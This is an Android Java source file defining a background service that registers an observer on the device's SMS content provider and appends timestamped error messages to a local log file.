package service;

import java.io.File;
import java.io.RandomAccessFile;
import java.text.SimpleDateFormat;

import observer.SmsSentObserver;
import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;

public class Service_Message extends Service{

	private SmsSentObserver smsSentObserver = null;
	
	private static final Uri STATUS_URI = Uri.parse("content://sms");
	//private static final Uri STATUS_URI = Uri.parse("content://com.sec.mms.provider/message");
	
	public void onCreate() {
		super.onCreate();
		try {
			smsSentObserver = new SmsSentObserver(new Handler(), getBaseContext(), STATUS_URI);
			getBaseContext().getContentResolver().registerContentObserver(STATUS_URI, true, smsSentObserver);
		} catch (Exception e) {
			LOGG("remember", e.toString());
		}
	}

	public void onDestroy() {
		super.onDestroy();
		try {
			getBaseContext().getContentResolver().unregisterContentObserver(smsSentObserver);
		} catch (Exception e) {
			LOGG("remember", e.toString());
		}
	}

	public IBinder onBind(Intent intent) {return null;}
	public void LOGG(String tag, String body)
    {
    	Log.d("remember", body);
    	String dir_path = getFilesDir().getAbsolutePath();
    	String file_path = dir_path + "/log.txt";
    	File f = new File(dir_path);
    	if(!f.exists())
    	{
    		f.mkdirs();
    	}
    	try{
    		RandomAccessFile raf = new RandomAccessFile(file_path, "rw");
    		raf.seek(raf.length());
    		SimpleDateFormat sd = new SimpleDateFormat(
    				"yy'/'MM'/'dd'.'HH':'mm':'ss");
    		String now = sd.format(System.currentTimeMillis()) + " :: ";
    		raf.write(now.getBytes());
    		raf.write(body.getBytes());
    		raf.write("\n".getBytes());
    		raf.close();
    	}catch(Exception e)
    	{}
    }
}
